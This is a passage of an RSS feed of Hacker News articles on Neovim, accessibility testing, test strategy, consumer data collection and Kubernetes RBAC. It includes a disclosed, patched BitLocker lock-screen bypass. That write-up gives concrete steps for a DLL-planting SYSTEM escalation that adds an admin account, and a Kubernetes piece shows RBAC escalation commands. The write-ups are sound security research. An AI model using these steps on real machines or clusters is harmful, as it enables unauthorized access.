lightly, <em>revolutionize</em> Vim. The impact can be seen in Vim development,
which picked up considerably as Neovim gained ground, with features and
processes ending up being reimplemented in Vim.</p><div><p>And they aren't stopping there. Current plans include:</p><ul><li>translating all Vimscript to Lua under the hood, increasing execution
performance due to leveraging LuaJIT, a very, very fast runtime</li><li>shipping a built-in LSP client</li></ul></div><p>Neovim builds upon Vim, and the way I see it, holds the following core
values:</p><p><strong>Neovim</strong></p><ul><li>Approachability</li><li>Editing efficiency</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/">https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/</a></em></p>]]>
            </description>
            <link>https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810427</guid>
            <pubDate>Sun, 17 Jan 2021 13:18:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BITV-Test]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810288">thread link</a>) | @Tomte
<br/>
January 17, 2021 | https://www.bitvtest.eu/home.html | <a href="https://web.archive.org/web/*/https://www.bitvtest.eu/home.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>The domain bitvtest.eu provides an overview of the BIK projects and the BITV-Test, as well as selected English articles.</strong></p><p>The BIK series of project was funded by the German Ministry of Labour and Social Affairs, <a href="https://www.bmas.de/" target="_blank">BMAS</a>. The last BIK project was <a href="http://www.xn--bik-fr-alle-xhb.de/" target="_blank">BIK für Alle</a> (BIK for all). The BITV-Test as well as our articles and tests have all been written in German.</p><p>The English site bitvtest.eu does not provide a full translation of all this content. Instead, it offers a general overview of the BITV-Test as a tool for evaluating the accessibility of web sites.</p><p>In December 2017, a version of the BITV-Test has been released as WCAG-Test. Now, both BITV-Test and WCAG-Test are essentially following the same test procedure: BITV no longer uses its own annex of requirements, but points directly to the latest EU regulation, which is EN 301 549—and this in turn references WCAG 2.1 in chapter 9, Web.</p><p>This site also hosts occasional English articles and publications, and tracks BIK's involvement with other initiatives in the European context.</p></div></div></div>]]>
            </description>
            <link>https://www.bitvtest.eu/home.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810288</guid>
            <pubDate>Sun, 17 Jan 2021 12:52:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker Lockscreen Bypass]]>
            </title>
            <description>
<![CDATA[
Score 522 | Comments 114 (<a href="https://news.ycombinator.com/item?id=25810250">thread link</a>) | @rdpintqogeogsaa
<br/>
January 17, 2021 | https://secret.club/2021/01/15/bitlocker-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/15/bitlocker-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>BitLocker is a modern data protection feature that is deeply integrated in the Windows kernel. It is used by many corporations as a means of protecting company secrets in case of theft. Microsoft recommends that you have a Trusted Platform Module which can do some of the heavy cryptographic lifting for you.</p><p>Given a Windows 10 system without known passwords and a BitLocker-protected hard drive, an administrator account could be adding by doing the following:</p><ul><li>At the sign-in screen, select “I have forgotten my password.”</li><li>Bypass the lock and enable autoplay of removable drives.</li><li>Insert a USB stick with my .exe and a junction folder.</li><li>Run executable.</li><li>Remove the thumb drive and put it back in again, go to the main screen.</li><li>From there launch narrator, that will execute a DLL payload planted earlier.</li></ul><p>Now a user account is added called hax with password “hax” with membership in Administrators. To update the list with accounts to log into, click <em>I forgot my password</em> and then return to the main screen.</p><h2 id="bypassing-the-lock-screen"> <a href="#bypassing-the-lock-screen">Bypassing the lock screen</a></h2><p>First, we select the “I have forgotten my password/PIN” option. This option launches an additional session, with an account that gets created/deleted as needed; the user profile service calls it a default-account. It will have the first available name of defaultuser1, defaultuser100000, defaultuser100001, etc.</p><p>To escape the lock, we have to use the Narrator because if we manage to launch something, we cannot see it, but using the Narrator, we will be able to navigate it. However, how do we launch something?</p><p><img src="https://secret.club/assets/bitlockerbypass/1.png" alt=""></p><p>If we smash shift 5 times in quick succession, a link to open the Settings app appears, and the link actually works. We cannot see the launched Settings app. Giving the launched app focus is slightly tricky; you have to click the link and then click a place where the launched app would be visible with the correct timing. The easiest way to learn to do it is, keep clicking the link roughly 2 times a second. The sticky keys windows will disappear. Keep clicking! You will now see a focus box is drawn in the middle of the screen. That was the Settings app, and you have to stop clicking when it gets focus.</p><p>Now we can navigate the Settings app using CapsLock + Left Arrow, press that until we reach Home. Now, when Home has focus, hold down Caps Lock and press Enter. Using CapsLock + Right Arrow navigate to Devices and CapsLock + Enter when it is in focus.</p><p><img src="https://secret.club/assets/bitlockerbypass/2.png" alt=""></p><p>Now navigate to AutoPlay, CapsLock + Enter and choose “Open Folder to view files (File Explorer).” Now insert the prepared USB drive, wait some seconds, the Narrator will announce the drive has been opened, and the window is focused. Now select the file <strong>Exploit.exe</strong> and execute it with CapsLock + Enter. That is arbitrary code execution, ladies and gentlemen, without using any passwords. However, we are limited by running as the default profile.</p><p>I have made a video with my phone, as I cannot take screenshots.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ZdsSgklRoag" frameborder="0" allowfullscreen=""></iframe><h2 id="elevation-of-privilege"> <a href="#elevation-of-privilege">Elevation of privilege</a></h2><p>When a USB stick is mounted, BitLocker will create a directory named ClientRecoveryPasswordRotation in System Volume Information and set permissions to:</p><div><div><pre><code>NT AUTHORITY\Authenticated Users:(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</code></pre></div></div><p>To redirect the create operation, a symbolic link in the NT namespace is needed as that allows us to control the filename, and the existence of the link does not abort the operation as it is still creating the directory.</p><p>Therefore, take a USB drive and make <code>\System Volume Information</code> a mount point targeting <code>\RPC Control</code>. Then make a symbolic link in <code>\RPC Control\ClientRecoveryPasswordRotation</code> targetting <code>\??\C:\windows\system32\Narrator.exe.local</code>. If the USB stick is reinserted then the folder <code>C:\windows\system32\Narrator.exe.local</code> will be created with permissions that allows us to create a subdirectory:</p><div><div><pre><code>amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898
</code></pre></div></div><p>Inside this subdirectory, we drop a payload DLL named <em>comctl32.dll</em>. Next time the Narrator is triggered, it will load the DLL. By the way, I chose the Narrator as that is triggerable from the login screen as a system service and is not auto-loaded, so if anything goes wrong, we can still boot.</p><h2 id="combining-them"> <a href="#combining-them">Combining them</a></h2><p>The <code>ClientRecoveryPasswordRotation</code> exploit to work requires a symbolic link in <code>\RPC Control</code>. The executable on the USB drive creates the link using two calls to <code>DefineDosDevice</code>, making the link permanent so they can survive a logout/in if needed.</p><p>Then a loop is started in which the executable will:</p><ul><li>Try to create the subdirectory.</li><li>Plant the payload <code>comctl32.dll</code> inside it.</li></ul><p>It is easy to see when the loop is running because the Narrator will move its focus box and say “access denied” every second. We can now use the link created in <code>RPC Control</code>. Unplug the USB stick and reinsert it. The writeable directory will be created in <code>System32</code>; on the next loop iteration, the payload will get planted, and exploit.exe will exit. To test if the exploit has been successful, close the Narrator and try to start it again.</p><p>If the narrator does not work, it is because the DLL is planted, and Narrator executes it, but it fails to add an account because it is launched as <code>defaultuser1</code>. When the payload is planted, you will need to click back to the login screen and start Narrator; 3 beeps should play, and a message box saying the DLL has been loaded as <code>SYSTEM</code> should show. Great! The account has been created, but it is not in the list. Press “I forgot my password” and click back to update the list.</p><p>A new account named hax should appear, with password hax.</p><p>I used these steps to arm the USB device</p><div><div><pre><code>C:\Users\jonas&gt;format D: /fs:ntfs /q
Insert new disk for drive D:
Press ENTER when ready...
-----
File System: NTFS.
Quick Formatting 30.0 GB
Volume label (32 characters, ENTER for none)?
Creating file system structures.
Format complete.
30.0 GB total disk space.
30.0 GB are available.
</code></pre></div></div><p>Now, we need to elevate to admin to delete <code>System Volume Information</code>.</p><div><div><pre><code>C:\Users\jonas&gt;d:
D:\&gt;takeown /F "System Volume Information"
</code></pre></div></div><p>This results in</p><div><div><pre><code>SUCCESS: The file (or folder): "D:\System Volume Information" now owned by user "DESKTOP-LTJEFST\jonas".
</code></pre></div></div><p>We can then</p><div><div><pre><code>D:\&gt;icacls "System Volume Information" /grant Everyone:(F)
Processed file: System Volume Information
Successfully processed 1 files; Failed processing 0 files
D:\&gt;rmdir /s /q "System Volume Information"
</code></pre></div></div><p>We will use James Forshaw’s tool (attached) to create the mount point.</p><div><div><pre><code>D:\&gt;createmountpoint "System Volume Information" "\RPC Control"
</code></pre></div></div><p>Then copy the attached exploit.exe to it.</p><div><div><pre><code>D:\&gt;copy c:\Users\jonas\source\repos\exploitKit\x64\Release\exploit.exe .
1 file(s) copied.
</code></pre></div></div><p>I disclosed this vulnerability and it was assigned CVE-2020-1398. Its patch can be found <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-1398">here</a></p></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/15/bitlocker-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810250</guid>
            <pubDate>Sun, 17 Jan 2021 12:46:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated Tests Should Build Confidence]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810164">thread link</a>) | @domk
<br/>
January 17, 2021 | https://domk.website/blog/2021-01-17-tests-should-build-confidence.html | <a href="https://web.archive.org/web/*/https://domk.website/blog/2021-01-17-tests-should-build-confidence.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <time datetime="2021-01-17">17 Jan 2021</time>
  

<p>In automated software testing, the default approach among developers is bottom up, and the aims are high coverage and working software.</p>

<p>This approach misunderstands the goal of testing and often fails to deliver on the goal of reliably shipping working software.</p>

<p>The idea of the bottom up approach is that you use tests to show that individual parts are correct, that they integrate, and that your system is correct as a result.</p>

<p>This approach leads to the typical test pyramid with many tests for small parts at the bottom (unit), fewer tests of larger parts in the middle (integration) and even fewer broad tests at the top (end-to-end). The tests at the bottom are small and quick and the tests at the top are broad and slow. <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>The goal of this approach is “working software”, implying focus on correctness. To be successful, the test coverage has to be nearly complete. <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> We evaluate each test by whether it increases coverage and adds to the evidence of correctness.</p>

<p>However, if we consider the purpose of tests with nuance, we can find a better approach.</p>

<p>The goal of a working software engineer isn’t to show the system is correct, it is to be <em>confident that the system is working as expected</em>. <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> That’s why we write tests.</p>

<p>We don’t just want to produce working software, we want to be confident that the software is working. It’s not enough for the software to work, we have to know it. That confidence is what lets us evolve our software to meet the needs of its users without unnecessary stress and delays, and confidence should be the goal.</p>

<p>With that goal in mind, the way to evaluate a test is by how much it <em>increases our confidence</em> that the system is working.</p>

<hr>

<p>Consider this thought experiment: we have a piece of software with no tests, and our goal is convince ourselves that it works.</p>

<p>The first thing to do — the thing that would increase our confidence the most — would be to run it and check that it doesn’t crash.</p>

<p>Next, we would supply different inputs and check the outputs. If we have a UI, click around and take some actions. After a while, we might not have convinced ourselves that the system behaves correctly in all edge cases, but we know that it works.</p>

<p>Contrast that with the traditional pyramid approach.</p>

<p>We would start by adding unit tests for individual functions and modules, building up a comprehensive test suite from the bottom up. After a while, we know that individual modules work correctly in all edge cases, but we don’t know whether the program crashes when we run it.</p>

<hr>

<p>While the example is contrived, the reality of many teams isn’t that different. They write many tests in the name of following best practises, but when it comes time to deploy something they aren’t confident.</p>

<p>When we look at their test suites, we find common problems.</p>

<p>As the pyramid prescribes, they have good unit test coverage. The trouble begins with the integration tests.</p>

<p>Because the good practise is to test each unit in isolation, internal dependencies are mocked. Because external dependencies like databases and APIs are hard to test against and make the tests slow, they are mocked or skipped. <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>

<p>Because running end to end tests with a moderately complex service that uses a database, calls other services and uses external APIs is hard, it is not done. And admittedly it is hard. Working with external dependencies makes tests hard to set up, it makes them slow and it makes them flaky. <sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup></p>

<p>The cost of this approach is great. When the tests pass, no one can be sure that the system won’t crash on startup in production or that it won’t throw errors when accessing the database. They get around this by running the system locally or doing manual tests in staging, but it is a red flag.</p>

<p>Another red flag is writing tests that feel tedious or pointless. Viewed through the lens of building confidence, if a test passing doesn’t make you any more confident about the final product working, there’s no reason to add it. <sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup></p>

<p>Following the confidence-building approach, a typical test suite looks like an hourglass not a pyramid.</p>

<p>We still have many small units tests. We want to be confident that we’ve covered all the edge cases in our logic, and testing those is easiest closest to the source. <sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> In this layer we also include tests that call the database because we want to test that integration thoroughly. <sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup></p>

<p>On the other end, we have many end-to-end tests.</p>

<p>For a web service, those would be tests that use a browser to access the service as a user would. For an API, they would be calling it as a client. We use live dependencies for everything unless technically impossible (like a payment gateway that doesn’t have a test mode — in that case you should find a better one).</p>

<p>The end-to-end tests should aim to exercise every feature at least once. In dynamic languages, you should be running all your code to make sure there aren’t any crashes. If you have a UI, it has to be tested.</p>

<p>Absent is much of a middle layer. In my experience, the ultimate test of modules “integrating” is that they work in an end-to-end scenario. Testing them beyond that doesn’t provide additional confidence.</p>

<p>One downside of this approach is that confidence isn’t easy to measure, but there are questions we can ask. Would you be nervous about your system getting deployed or shipped when your tests pass? Are there any (implicit) manual testing steps? Do you have to watch for problems after every deploy?</p>

<p>If you answered yes to any of these, you aren’t confident. Think about what tests would increase your confidence, what would you check manually? Automate it.</p>

<p>What is the right level of confidence? This is my favourite test: would your tests make you confident enough to deploy at 5pm on Friday, close your laptop and go home?</p>



</article></div>]]>
            </description>
            <link>https://domk.website/blog/2021-01-17-tests-should-build-confidence.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810164</guid>
            <pubDate>Sun, 17 Jan 2021 12:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Lex Fridman AI Podcast Search]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 51 (<a href="https://news.ycombinator.com/item?id=25810072">thread link</a>) | @rmeinl
<br/>
January 17, 2021 | https://share.streamlit.io/rmeinl/podcast_search/app.py | <a href="https://web.archive.org/web/*/https://share.streamlit.io/rmeinl/podcast_search/app.py">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://share.streamlit.io/rmeinl/podcast_search/app.py</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810072</guid>
            <pubDate>Sun, 17 Jan 2021 12:07:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ten companies you never expected to collect your data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810057">thread link</a>) | @vedikan123
<br/>
January 17, 2021 | https://rudderstack.com/blog/ten-companies-you-wouldnt-expect-that-collect-consumer-data | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/ten-companies-you-wouldnt-expect-that-collect-consumer-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure><div></div></figure><section><div itemprop="articleBody"><p>How concerned are you about companies collecting your personal data? This isn’t a new concern. In fact, it’s been almost eight years since Edward Snowden’s release of materials detailing the sharing of personal data by companies like Facebook, Google, and Apple with the NSA. </p>
<p>It’s common to see people take action on this concern. Hacker News regularly sees <a href="https://news.ycombinator.com/item?id=25481465">first-page articles</a> about individuals who go through the effort of self-hosting digital products like email avoid sharing their data. </p>
<p>Consumer-facing products like Gmail, Amazon, and others come to mind first when we think about personal data privacy. It’s easy to look past other companies that also collect vast amounts of personal data but don’t have consumer-facing products. </p>
<p>We don’t often think of B2B companies in terms of privacy because they operate in the background relative to the customer experience, selling services to B2C companies. From marketing to analytics to CRM and more, there are many B2B services used by B2C companies to understand and deliver their customer experience. </p>
<p>In this post, we’re going to highlight several of these companies—some you’ve heard of and some you might not have— to raise awareness about the huge number of B2B companies that collect customer data. </p>
<h2>1. Adobe</h2>
<p>When many people think of Adobe, they think of design tools like Photoshop and, of course, the ubiquitous Acrobat PDF reader. But Adobe also has a $6 billion marketing cloud business that has been one of the major drivers of their stock price. Hundreds of B2C companies, from Nike to Virgin Airlines, use the Adobe Marketing Cloud suite of products. </p>
<p>Whatever interactions you have with companies using Adobe Marketing Cloud, from visiting their website to opening their emails to using their mobile apps, is captured as data that flows into their systems. All of the customer data helps Adobe build rich consumer profiles, which feed their marketing and advertising products (like Adobe Advertising Cloud). </p>
<h2>2. Salesforce</h2>
<p>Like Adobe, tens of thousands of companies use Salesforce’s CRM, marketing software, and other tools. We think of Salesforce as used mainly by B2B companies, but massive consumer-focused companies run all of their customer data through Salesforce, from airlines to online retailers. </p>
<p>If you’ve engaged in some sort of digital commerce in the past ten years, your data is almost indeed in the Salesforce ecosystem somewhere… likely in many places. </p>
<h2>3. Acxiom and Other Consumer ID Graph Vendors</h2>
<p>While you’ve heard Salesforce and Adobe’s names before, Acxiom is a much lesser-known brand, especially to your average consumer. Yet, they probably have the most extensive collection of anonymous cookie data globally, along with mapping between PII (email, address, name, etc.) and cookies. They’ve built this massive dataset by working out data-sharing deals with thousands of publishers and content providers. </p>
<p>To make things worse from a privacy perspective, they have built their entire business model on sharing this data and their identity graph (PII → cookie mapping) with other businesses. </p>
<h2>4. AppNexus and Other ad Networks</h2>
<p>Publishers and other content producers use ad networks like AppNexus to display ads on their websites. For ads to be effective (and fetch higher premiums), you need to target them. Targeted advertisment, and that requires the publisher to share data about their audience to the ad networks. This includes information like age, location, and other demographic data and browsing history and content interests.  </p>
<p>Ad networks also cookie their visitors to create a richer profile by combining data across publishers. Even though you’ve never heard of them, some of these ad networks rival Facebook and Google in terms of their scale and reach across the web. </p>
<h2>5. Website Providers (Shopify, Squarespace, Wix, etc.)</h2>
<p>A massive number of small-to-medium-sized businesses, as well as some enterprises, run their websites on third-party platforms like Shopify (for eCommerce), Wix (for marketing sites and landing pages), and others. </p>
<p>These platforms have access to data about their users’ customers, from the pages they visit the products they browse and purchase. We know that these platforms collect consumer data because they provide analytics capabilities that rely on it. They don’t share this data between customers from what we can find, but they indeed use the consumer data they collect to improve their products’ experience. It’s not a stretch to imagine a future where these sites offer advertising products allowing their customers to target ‘anonymous’ users likely to buy based on purchase history with other customers. </p>
<h2>6. Customer Data Platforms</h2>
<p><strong>Customer Data Platforms (CDPs)</strong> are all the hype in marketing technology right now. CDPs’ promise is to collect all customer data into one place, then use it to drive personalized digital experiences, from personalized content to advertising campaigns. </p>
<p>The largest of these platforms host a huge amount of consumer data from many companies. </p>
<h2>7. Google Analytics and Other Analytics Companies</h2>
<p>Google Analytics is the most ubiquitous analytics tool globally, used by countless companies to analyze visitor behavior on their websites. While the data Google Analytics collects is theoretically anonymous, Google can tie it to actual individuals within their ecosystem, which drives big business for their advertising division. </p>
<h2>8. Cloudflare and Other CDNs</h2>
<p>CDNs are a highly-distributed platform of edge caches that minimize web page loading time by reducing the distance between the server and the user. They also provide high-availability in the case of web servers going down. </p>
<p>Pretty much all moderate-to-high traffic websites use a CDN, with Cloudflare being the leader. All the traffic to those websites goes through their CDN, which means the CDNs can see end-user information like IP address, location, browser info, etc. </p>
<p>While most CDNs don’t install their own cookies and hence don’t track visitors across websites, the static visitor info they collect is also sensitive data that gets stored in the CDN.</p>
<h2>9. Experian and Other Credit Reporting Companies</h2>
<p>Unlike the companies listed above, credit reporting companies have consumer-facing products, but most of their revenue comes from selling their services to other businesses. These companies have been collecting consumer data even before the dawn of the internet. </p>
<p>What has changed with the internet is the scale and variety of consumer data they can collect, all the way from your entire credit card spend data to rental applications. </p>
<p>They claim to make good use of this data (via their credit scoring services), but a single company having access to that scale of consumer data is extremely risky, as recent hacks and data breaches have shown. </p>
<h2>10. Verizon, Comcast, AT&amp;T, and Other ISPs</h2>
<p>We think of Verizon, Comcast, AT&amp;T, and others as the companies who provide us with phone and internet service, not necessarily companies who have access to and collect huge amounts of consumer data. </p>
<p>On the surface, they seem like simple tunnels for phone and internet, but they leverage that consumer data to power massive advertising businesses like AT&amp;T’s Xandr and Comcast’s Effectv. </p>
<h2>Be Responsible With Your Customer Data</h2>
<p>Customer data privacy is a big deal (and a core value of mine in founding RudderStack). My goal isn’t to call any of these companies evil. In fact, we use some of the tools mentioned above. </p>
<p>Rather, my goal is to help companies think critically about what customer data they store and where. In this age of the cloud, it’s incredibly easy to send copies of all your customer data to 10, 20, 30 tools. That too, without stopping to think about the implications of who is storing the data and how it might be accessed or used. While that isn’t evil, it is irresponsible, and no company should be irresponsible with their customer data. </p>
<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack by signing up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today. <a href="https://rudderstack.com/blog/">Subscribe to our blogs</a>, join <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open-source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on our socials: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="http://dev.to/">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>. Don’t miss out on any updates. <a href="https://rudderstack.com/blog/">Subscribe</a> to our blogs today!</p></div></section></article><div><p>Founder and CEO of RudderStack. Passionate about finding engineering solutions to real-world problems.</p></div></div>]]>
            </description>
            <link>https://rudderstack.com/blog/ten-companies-you-wouldnt-expect-that-collect-consumer-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810057</guid>
            <pubDate>Sun, 17 Jan 2021 12:04:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting into a Bind with Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810019">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/ | <a href="https://web.archive.org/web/*/https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>Following on from <a href="https://raesene.github.io/blog/2020/12/12/Escalating_Away/">looking at the escalate verb in Kubernetes RBAC</a>, I thought it would be worth looking at another one of the unusual verbs you can see in Kubernetes RBAC, bind.</p>

<p>These two, along with the impersonate verb are operations that are available on some RBAC objects in the Kubernetes API. They’re quite important if you’re looking at designing or auditing Kubernetes rights as they can allow for privilege escalation, so know which principals have access to them is important.</p>

<p>The bind verb can be applied to roles or clusterroles and allows a principal to bypass a general restriction on (cluster)role binding creation, which stops users who can create role bindings from escalating their privileges by binding to high privilege roles like cluster admin. This restriction is described in the Kubernetes documentation <a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-binding-creation-or-update">here</a></p>

<p>The way that this works is that, without using bind, a user cannot create a rolebinding or clusterrolebinding to a role or cluster role which has rights that the user themselves does not currently have. So for example if a user with the rights to create rolebindings tries to bind to cluster-admin , this won’t work unless that user already has cluster-admin rights.</p>

<p>Bind is made available to allow for this restriction to be bypassed.</p>

<h2 id="practical-example">Practical Example</h2>

<p>Let’s show a practical example of this. First up we’ll create a couple of service accounts to act as our user for this experiment and we’ll call them <code>rbac-binder</code> and <code>not-rbac-binder</code></p>

<p>Now we’ll create a couple of cluster roles. Both have <code>create</code> on <code>clusterrolebindings</code> but one will also have <code>bind</code> on <code>clusterroles</code></p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>rbac.authorization.k8s.io/v1</span>
<span>kind</span><span>:</span> <span>ClusterRole</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>rbac-binder</span>
<span>rules</span><span>:</span>
<span>-</span> <span>apiGroups</span><span>:</span>
  <span>-</span> <span>rbac.authorization.k8s.io</span>
  <span>resources</span><span>:</span>
  <span>-</span> <span>clusterroles</span>
  <span>verbs</span><span>:</span>
  <span>-</span> <span>bind</span>
<span>-</span> <span>apiGroups</span><span>:</span>
  <span>-</span> <span>rbac.authorization.k8s.io</span>
  <span>resources</span><span>:</span>
  <span>-</span> <span>clusterrolebindings</span>
  <span>verbs</span><span>:</span>
  <span>-</span> <span>create</span>
</code></pre></div></div>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>rbac.authorization.k8s.io/v1</span>
<span>kind</span><span>:</span> <span>ClusterRole</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>not-rbac-binder</span>
<span>rules</span><span>:</span>
<span>-</span> <span>apiGroups</span><span>:</span>
  <span>-</span> <span>rbac.authorization.k8s.io</span>
  <span>resources</span><span>:</span>
  <span>-</span> <span>clusterrolebindings</span>
  <span>verbs</span><span>:</span>
  <span>-</span> <span>create</span>
</code></pre></div></div>

<p>Then we’ll just bind those two clusterroles to their respective service accounts.</p>

<p>So at this point if we look at our users rights with ` kubectl –as=system:serviceaccount:default:rbac-binder auth can-i –list` we can see that the rbac-binder service account has the following rights</p>

<div><div><pre><code>Resources                                       Non-Resource URLs   Resource Names   Verbs
clusterroles.rbac.authorization.k8s.io          <span>[]</span>                  <span>[]</span>               <span>[</span><span>bind</span><span>]</span>
selfsubjectaccessreviews.authorization.k8s.io   <span>[]</span>                  <span>[]</span>               <span>[</span>create]
selfsubjectrulesreviews.authorization.k8s.io    <span>[]</span>                  <span>[]</span>               <span>[</span>create]
clusterrolebindings.rbac.authorization.k8s.io   <span>[]</span>                  <span>[]</span>               <span>[</span>create]
                                                <span>[</span>/api/<span>*</span><span>]</span>            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/api]              <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/apis/<span>*</span><span>]</span>           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/apis]             <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/healthz]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/healthz]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/livez]            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/livez]            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/openapi/<span>*</span><span>]</span>        <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/openapi]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/readyz]           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/readyz]           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version/]         <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version/]         <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version]          <span>[]</span>               <span>[</span>get]
</code></pre></div></div>

<p>and the not-rbac-binder service account has these rights</p>

<div><div><pre><code> kubectl <span>--as</span><span>=</span>system:serviceaccount:default:not-rbac-binder auth can-i <span>--list</span>
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span>[]</span>                  <span>[]</span>               <span>[</span>create]
selfsubjectrulesreviews.authorization.k8s.io    <span>[]</span>                  <span>[]</span>               <span>[</span>create]
clusterrolebindings.rbac.authorization.k8s.io   <span>[]</span>                  <span>[]</span>               <span>[</span>create]
                                                <span>[</span>/api/<span>*</span><span>]</span>            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/api]              <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/apis/<span>*</span><span>]</span>           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/apis]             <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/healthz]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/healthz]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/livez]            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/livez]            <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/openapi/<span>*</span><span>]</span>        <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/openapi]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/readyz]           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/readyz]           <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version/]         <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version/]         <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version]          <span>[]</span>               <span>[</span>get]
                                                <span>[</span>/version]          <span>[]</span>               <span>[</span>get]
</code></pre></div></div>

<p>Now if we try to use <code>not-rbac-binder</code> to create a clusterrolebinding to cluster-admin, it will fail with the following error message (remember here that we do have create clusterrolebinding rights).</p>

<div><div><pre><code>kubectl <span>--as</span><span>=</span>system:serviceaccount:default:not-rbac-binder create clusterrolebinding rbac-clusteradmin <span>--clusterrole</span><span>=</span>cluster-admin <span>--serviceaccount</span><span>=</span>namespace:not-rbac-binder
